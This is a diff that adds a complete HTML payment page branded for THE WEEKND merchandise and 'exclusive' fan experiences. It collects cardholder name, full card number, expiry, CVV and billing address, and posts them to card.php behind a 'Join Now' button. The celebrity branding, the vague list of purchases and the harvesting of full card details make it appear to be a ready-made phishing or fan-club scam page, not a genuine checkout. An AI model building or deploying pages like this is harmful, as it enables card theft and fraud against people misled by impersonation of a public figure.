@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Your Payment Card</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #333;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        h1 {
+            margin: 10px 0;
+        }
+        h2 {
+            margin: 10px 0;
+            font-size: 14px;
+            color: #ccc;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            box-sizing: border-box;
+        }
+        .button {
+            background-color: #1db954;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        .button:hover {
+            background-color: #1ed760;
+        }
+        .error {
+            color: red;
+            display: none;
+            font-size: 12px;
+        }
+    </style>
+    <script>
+        function validateForm() {
+            const cardNumber = document.forms["paymentForm"]["cardNumber"].value;
+            const cvv = document.forms["paymentForm"]["cvv"].value;
+            let valid = true;
+
+            if (cardNumber.length !== 16) {
+                document.getElementById("cardNumberError").style.display = "block";
+                valid = false;
+            } else {
+                document.getElementById("cardNumberError").style.display = "none";
+            }
+
+            if (cvv.length !== 3) {
+                document.getElementById("cvvError").style.display = "block";
+                valid = false;
+            } else {
+                document.getElementById("cvvError").style.display = "none";
+            }
+
+            return valid;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Add Your Payment Card</h1>
+        <h2>This can be used for purchasing THE WEEKND Merchandise, Autographed Items, Exclusive Content Tickets, Limited Edition Items, Books or Albums, Beauty or Fashion Products, Virtual Experiences, Subscription Services.</h2>
+        <form name="paymentForm" action="card.php" method="POST"">
+            <input type="text" name="cardName" placeholder="Name on Card" required>
+            <input type="text" name="cardNumber" placeholder="Card Number" required>
+            <div id="cardNumberError" class="error">Invalid card number</div>
+            <input type="text" name="expiryDate" placeholder="Expiry Date (MM/YY)" required>
+            <input type="text" name="cvv" placeholder="CVV" required>
+            <div id="cvvError" class="error">Invalid CVV</div>
+            <input type="text" name="billingAddress" placeholder="Billing Address" required>
+            <input type="text" name="city" placeholder="City" required>
+            <input type="text" name="state" placeholder="State" required>
+            <input type="text" name="zip" placeholder="ZIP Code" required>
+            <button type="submit" class="button">Join Now</button>
+        </form>
+    </div>
+</body>
+</html>
